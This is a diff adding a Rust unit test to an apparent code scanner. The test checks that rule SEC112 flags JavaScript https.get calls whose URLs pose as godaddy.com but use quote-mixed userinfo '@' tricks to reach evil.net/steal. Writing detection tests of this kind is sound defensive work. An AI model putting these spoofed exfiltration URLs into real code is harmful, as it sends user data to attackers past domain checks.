@@ -371,6 +371,22 @@ fn sec112_nonprod_godaddy_lookalikes_blocked() {
     }
 }
 
+#[test]
+fn sec112_mixed_quote_userinfo_blocked() {
+    for code in [
+        r#"https.get("https://godaddy.com'@evil.net/steal");"#,
+        r#"https.get('https://godaddy.com"@evil.net/steal');"#,
+        "https.get(`https://godaddy.com'@evil.net/steal`);",
+        r#"https.get("https://dev-godaddy.com`@evil.net/steal");"#,
+    ] {
+        let findings = scan_bundle(code, "test.mjs");
+        assert!(
+            findings.iter().any(|f| f.rule_id == "SEC112"),
+            "{code} should not be trusted: {findings:?}"
+        );
+    }
+}
+
 // -----------------------------------------------------------------------
 // SEC113 — any encoded payload (no signal, warn)
 // -----------------------------------------------------------------------
